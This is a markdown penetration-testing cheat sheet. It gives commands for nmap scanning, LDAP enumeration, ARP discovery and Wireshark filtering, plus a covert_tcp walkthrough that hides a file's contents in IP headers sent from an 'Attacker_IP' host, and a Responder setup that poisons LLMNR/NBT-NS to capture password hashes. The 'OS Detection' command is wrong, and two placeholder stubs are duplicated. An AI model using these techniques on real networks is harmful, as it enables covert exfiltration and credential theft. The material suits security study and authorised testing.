# Network Hacking

<details>
<summary>Nmap</summary>

## Nmap

* Scan for a live host

```console
nmap -sP <TARGET>
nmap -sn <TARGET>
```

* Scan for open ports

```console
nmap -p --open <port> <TARGET>
```

* OS Detection

```console
nmap -p --open <port> <TARGET>
```

* Comprehensive scan.

```console
nmap -p- --open -vv -Pn <TARGET>
```
</details>

<details>
<summary>Nmap Scripts</summary>

## Nmap Scripts

* LDAP Enumeration.

```console
nmap -p 389 --script ldap-search <TARGET>
```
</details>

<details>
<summary>NetDiscover</summary>

## NetDiscover

* Perform an ARP scan across the entire network to identify live hosts.

```console
netdiscover -i eth0
netdiscover -r <TARGET>
```
</details>

<details>
<summary>Wireshark</summary>

## Wireshark

* Wireshark offers the capability to reconstruct a stream of plain text protocol packets into a format that is easily readable by humans

```shell
select_packet > follow > TCP Stream
```

* Filter by an specific HTTP Method

```shell
http.request.method == POST
http.request.method == GET
```

* Trace a DOS/DDOS attack

```shell
# Sort by packets in IPv4 based on number of the packets transfer
Statistics > Conversations > IPv4 > Packets
```
</details>

<details>
<summary>CovertTCP</summary>

## CovertTCP

CovertTCP conceals transmission of data inside the IP header.
* [Covert_TCP](Covert_TCP.c) 

This can be used to analyze .cap files. It traverses through each line in Wireshark, targeting the identification field. Keep an eye on Hex value and ANSI value. Downlaod and compile it.

```console
# Compiling Covert_TCP.c
cc -o covert_tcp covert_tcp.c
```

Now, specify the reciever machine (Client_IP). 

```console
sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 9999 -dest_port 8888 -server -file recieve.txt
```

Specifying the attacker machine (Attacker_IP). Create the message file that will be need to be transfered (ex. secret.txt)

```console
sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 8888 -dest_port 9999 -file secret.txt
```
The secret message is sent using Covert_TCP nad it is then captured using Wireshark.

</details>

<details>
<summary>LLMNR/NBT-NS Poisoning</summary>

## LLMNR/NBT-NS Poisoning

The tool [Responder](https://github.com/lgandx/Responder)  servers as a rogue authentication server to capture hashes. Utilizing this method, one could obtain the password of a logged-in user who is attempting to access an unavailable shared resource.

```console
# where -I = interface
responder -I eth0
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>

<details>
<summary>Hacking Tool</summary>

## Hacking Tool

* Add a brief description.

```console
# And some code
whoami
```
</details>
